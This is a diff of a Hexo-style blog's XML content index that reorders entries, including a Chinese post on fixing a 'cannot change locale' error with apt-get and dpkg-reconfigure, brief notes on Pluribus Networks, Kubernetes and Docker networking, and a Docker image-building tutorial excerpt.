-      <content type="html"><![CDATA[<p>运行locale命令<span id="more-912"></span><br>LANG=<br>LANGUAGE=<br>LC_CTYPE=”POSIX”<br>LC_NUMERIC=”POSIX”<br>LC_TIME=”POSIX”<br>LC_COLLATE=”POSIX”<br>LC_MONETARY=”POSIX”<br>LC_MESSAGES=”POSIX”<br>LC_PAPER=”POSIX”<br>LC_NAME=”POSIX”<br>LC_ADDRESS=”POSIX”<br>LC_TELEPHONE=”POSIX”<br>LC_MEASUREMENT=”POSIX”<br>LC_IDENTIFICATION=”POSIX”<br>LC_ALL=  </p>
-<p>修改profile</p>
-<p>vi /etc/profile</p>
-<p>添加如下内容</p>
-<p>export LC_ALL=en_US.UTF-8</p>
-<p>source /etc/profile</p>
-<p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory<br>&nbsp;运行 dpkg-reconfigure locales</p>
-<p>得到错误</p>
-<p>perl: warning: Setting locale failed.<br>perl: warning: Please check that your locale settings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANGUAGE = (unset),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LC_ALL = “en_US.UTF-8”,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANG = “en_US.UTF-8”<br>&nbsp;&nbsp;&nbsp; are supported and installed on your system.<br>perl: warning: Falling back to the standard locale (“C”).<br>locale: Cannot set LC_CTYPE to default locale: No such file or directory<br>locale: Cannot set LC_MESSAGES to default locale: No such file or directory<br>locale: Cannot set LC_ALL to default locale: No such file or directory<br>/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)  </p>
-<p>解决办法</p>
-<p>apt-get purge locales</p>
-<p>apt-get autoclean</p>
-<p>apt-get install locales</p>
-<p>cd /usr/share/locales</p>
-<p>./install-language-pack en_US.UTF-8</p>
-<p>dpkg-reconfigure locales</p>
-<p>修复完成</p>
-<p>运行locale</p>
-<p>LANG=en_US.UTF-8<br>LANGUAGE=<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=en_US.UTF-8</p>
-]]></content>
-      
-        <categories>
-            
-            <category> linux </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Linux </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[Perform Consistent Snapshots with qemu guest agent]]></title>
       <url>http://feisky.xyz/2015/02/09/perform-consistent-snapshots-with-qemu-guest-agent/</url>
       <content type="html"><![CDATA[<p>A while back, I <a href="http://www.sebastien-han.fr/blog/2012/12/10/openstack-perform-consistent-snapshots/" target="_blank" rel="external">wrote an article</a> about taking consistent snapshots of your virtual machines in your OpenStack environment.<br>    However this method was really intrusive since it required to be inside the virtual machine and to manually summon a filesystem freeze.<br>    In this article, I will use a different approach to achieve the same goal without the need to be inside the virtual machine.</p>
@@ -7506,6 +7467,45 @@ ADD static/ /www/static
 <pre><code>&gt; I’m really looking forward to the Kilo release now! What about you?
 </code></pre>]]></content>
       
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[cannot change locale]]></title>
+      <url>http://feisky.xyz/2015/02/09/cannot-change-locale/</url>
+      <content type="html"><![CDATA[<p>运行locale命令<span id="more-912"></span><br>LANG=<br>LANGUAGE=<br>LC_CTYPE=”POSIX”<br>LC_NUMERIC=”POSIX”<br>LC_TIME=”POSIX”<br>LC_COLLATE=”POSIX”<br>LC_MONETARY=”POSIX”<br>LC_MESSAGES=”POSIX”<br>LC_PAPER=”POSIX”<br>LC_NAME=”POSIX”<br>LC_ADDRESS=”POSIX”<br>LC_TELEPHONE=”POSIX”<br>LC_MEASUREMENT=”POSIX”<br>LC_IDENTIFICATION=”POSIX”<br>LC_ALL=  </p>
+<p>修改profile</p>
+<p>vi /etc/profile</p>
+<p>添加如下内容</p>
+<p>export LC_ALL=en_US.UTF-8</p>
+<p>source /etc/profile</p>
+<p>得到错误 setlocale: LC_ALL: cannot change locale (en_US.UTF-8): No such file or directory<br>&nbsp;运行 dpkg-reconfigure locales</p>
+<p>得到错误</p>
+<p>perl: warning: Setting locale failed.<br>perl: warning: Please check that your locale settings:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANGUAGE = (unset),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LC_ALL = “en_US.UTF-8”,<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LANG = “en_US.UTF-8”<br>&nbsp;&nbsp;&nbsp; are supported and installed on your system.<br>perl: warning: Falling back to the standard locale (“C”).<br>locale: Cannot set LC_CTYPE to default locale: No such file or directory<br>locale: Cannot set LC_MESSAGES to default locale: No such file or directory<br>locale: Cannot set LC_ALL to default locale: No such file or directory<br>/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)  </p>
+<p>解决办法</p>
+<p>apt-get purge locales</p>
+<p>apt-get autoclean</p>
+<p>apt-get install locales</p>
+<p>cd /usr/share/locales</p>
+<p>./install-language-pack en_US.UTF-8</p>
+<p>dpkg-reconfigure locales</p>
+<p>修复完成</p>
+<p>运行locale</p>
+<p>LANG=en_US.UTF-8<br>LANGUAGE=<br>LC_CTYPE=”en_US.UTF-8”<br>LC_NUMERIC=”en_US.UTF-8”<br>LC_TIME=”en_US.UTF-8”<br>LC_COLLATE=”en_US.UTF-8”<br>LC_MONETARY=”en_US.UTF-8”<br>LC_MESSAGES=”en_US.UTF-8”<br>LC_PAPER=”en_US.UTF-8”<br>LC_NAME=”en_US.UTF-8”<br>LC_ADDRESS=”en_US.UTF-8”<br>LC_TELEPHONE=”en_US.UTF-8”<br>LC_MEASUREMENT=”en_US.UTF-8”<br>LC_IDENTIFICATION=”en_US.UTF-8”<br>LC_ALL=en_US.UTF-8</p>
+]]></content>
+      
+        <categories>
+            
+            <category> linux </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Linux </tag>
+            
+        </tags>
         
     </entry>
     
@@ -8733,15 +8733,6 @@ This means that there is no need for manual setup of block devices, and that gen
     </entry>
     
     <entry>
-      <title><![CDATA[Pluribus Networks]]></title>
-      <url>http://feisky.xyz/2015/01/26/pluribus-networks/</url>
-      <content type="html"><![CDATA[<p>已经融资9500万美元的<a href="http://www.pluribusnetworks.com" target="_blank" rel="external">Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p>
-]]></content>
-      
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[vagrant]]></title>
       <url>http://feisky.xyz/2015/01/26/vagrant/</url>
       <content type="html"><![CDATA[<p>简易虚拟机管理工具vagrant</p>
@@ -8962,6 +8953,15 @@ neutron router-create --ha=<true |="" false=""> router1
     </entry>
     
     <entry>
+      <title><![CDATA[Pluribus Networks]]></title>
+      <url>http://feisky.xyz/2015/01/26/pluribus-networks/</url>
+      <content type="html"><![CDATA[<p>已经融资9500万美元的<a href="http://www.pluribusnetworks.com" target="_blank" rel="external">Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Docker]]></title>
       <url>http://feisky.xyz/2015/01/26/docker/</url>
       <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Docker 是 dotCloud 最近几个月刚宣布的开源引擎，旨在提供一种应用程序的自动化部署解决方案，简单的说就是，在 Linux 系统上迅速创建一个容器（类似虚拟机）并在容器上部署和运行应用程序，并通过配置文件可以轻松实现应用程序的自动化安装、部署和升级，非常方便。因为使用了容器，所以可以很方便的把生产环境和开发环境分开，互不影响，这是 docker 最普遍的一个玩法。更多的玩法还有大规模 web 应用、数据库部署、持续部署、集群、测试环境、面向服务的云计算、虚拟桌面 VDI 等等。</p>
@@ -8988,7 +8988,7 @@ neutron router-create --ha=<true |="" false=""> router1
 <p><none>              <none>              e01000c7bac8        6 weeks ago         336.5 MB<br>centos              latest              b157b77b1a65        8 weeks ago         243.7 MB<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"></div><div class="line">其中，镜像<span class="selector-tag">id</span>唯一标识了镜像，<span class="selector-tag">TAG</span>信息用来标记来自同一个仓库的不同镜像。例如<span class="selector-tag">ubuntu</span>仓库中有多个镜像，通过<span class="selector-tag">TAG</span>信息来区分发行版本，例如10<span class="selector-class">.04</span>、12<span class="selector-class">.04</span>、12<span class="selector-class">.10</span>、13<span class="selector-class">.04</span>、14<span class="selector-class">.04</span>等。创建容器时，如果不指定具体的标记，则默认使用<span class="selector-tag">latest</span>标记信息。</div><div class="line"></div><div class="line">除了从容器中下载已有镜像外，也可以根据已有镜像创建新的镜像。创建新镜像有多种方法：</div><div class="line"></div><div class="line">①修改已有镜像后<span class="selector-tag">commit</span></div></pre></td></tr></table></figure></none></none></p>
 <p>$ sudo docker run -t -i ubuntu:12.04 /bin/bash<br>root@a439b6e894bb:/# apt-get update<br>root@a439b6e894bb:/# apt-get install nginx<br>root@a439b6e894bb:/# /etc/init.d/nginx start<br>root@a439b6e894bb:/# exit<br>$ sudo docker commit -m ‘add ngnix’ -a ‘feisky’ a439b6e894bb ubuntu:nginx<br>0a693112c443ce4fb21bc57a26d67f0648b9415e052f929be7e06701f5f3ca2d<br>$ sudo docker images<br>REPOSITORY                               TAG                 IMAGE ID            CREATED             VIRTUAL SIZE<br>ubuntu                                   nginx               0a693112c443        9 seconds ago       153.1 MB<br>ubuntu                                   12.04               0a51fcc173d8        2 days ago          111 MB<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">②用dockerfile来创建镜像</div><div class="line"></div><div class="line">首先创建一个Dockerfile：</div></pre></td></tr></table></figure></p>
 <p>$ cat Dockerfile </p>
-<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x66;&#101;&#x69;&#115;&#x6b;&#121;&#x40;&#x72;&#x6f;&#x6f;&#116;">&#x66;&#101;&#x69;&#115;&#x6b;&#121;&#x40;&#x72;&#x6f;&#x6f;&#116;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
+<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#102;&#101;&#105;&#x73;&#x6b;&#121;&#64;&#114;&#111;&#111;&#x74;">&#102;&#101;&#105;&#x73;&#x6b;&#121;&#64;&#114;&#111;&#111;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
 <h1 id="put-my-local-site-to-var-www"><a href="#put-my-local-site-to-var-www" class="headerlink" title="put my local site to /var/www"></a>put my local site to /var/www</h1><p>ADD index.html /var/www/html/</p>
 <h1 id="expose-httpd-port"><a href="#expose-httpd-port" class="headerlink" title="expose httpd port"></a>expose httpd port</h1><p>EXPOSE 80</p>
 <h1 id="the-command-to-run"><a href="#the-command-to-run" class="headerlink" title="the command to run"></a>the command to run</h1><p>CMD [“/usr/sbin/nginx”]</p>
@@ -9114,18 +9114,18 @@ neutron router-create --ha=<true |="" false=""> router1
     </entry>
     
     <entry>
-      <title><![CDATA[docker网络配置方法总结 - feisky]]></title>
-      <url>http://feisky.xyz/2014/11/18/docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</url>
-      <content type="html"><![CDATA[<p>【摘要】docker启动时，会在宿主主机上创建一个名为docker0的虚拟网络接口，默认选择172.17.42.1/16，一个16位的子网掩码给容器提供了65534个IP地址。docker0只是一个在绑定到这上面的其他网卡间自动转发数据包的虚拟以太网桥，它可以使容器和主机相互通信,容器与容器间通信。问题是，… <a href="http://www.cnblogs.com/feisky/p/4105497.html" target="_blank" rel="external">阅读全文</a><img src="http://counter.cnblogs.com/blog/rss/4105497" alt=""></p>
+      <title><![CDATA[Kubernetes系统架构简介 - feisky]]></title>
+      <url>http://feisky.xyz/2014/11/18/Kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</url>
+      <content type="html"><![CDATA[<p>【摘要】1. 前言Together we will ensure that Kubernetes is a strong and open container management framework for any application and in any environment, whether i… <a href="http://www.cnblogs.com/feisky/p/4106456.html" target="_blank" rel="external">阅读全文</a><img src="http://counter.cnblogs.com/blog/rss/4106456" alt=""></p>
 ]]></content>
       
         
     </entry>
     
     <entry>
-      <title><![CDATA[Kubernetes系统架构简介 - feisky]]></title>
-      <url>http://feisky.xyz/2014/11/18/Kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</url>
-      <content type="html"><![CDATA[<p>【摘要】1. 前言Together we will ensure that Kubernetes is a strong and open container management framework for any application and in any environment, whether i… <a href="http://www.cnblogs.com/feisky/p/4106456.html" target="_blank" rel="external">阅读全文</a><img src="http://counter.cnblogs.com/blog/rss/4106456" alt=""></p>
+      <title><![CDATA[docker网络配置方法总结 - feisky]]></title>
+      <url>http://feisky.xyz/2014/11/18/docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</url>
+      <content type="html"><![CDATA[<p>【摘要】docker启动时，会在宿主主机上创建一个名为docker0的虚拟网络接口，默认选择172.17.42.1/16，一个16位的子网掩码给容器提供了65534个IP地址。docker0只是一个在绑定到这上面的其他网卡间自动转发数据包的虚拟以太网桥，它可以使容器和主机相互通信,容器与容器间通信。问题是，… <a href="http://www.cnblogs.com/feisky/p/4105497.html" target="_blank" rel="external">阅读全文</a><img src="http://counter.cnblogs.com/blog/rss/4105497" alt=""></p>
 ]]></content>
       
         
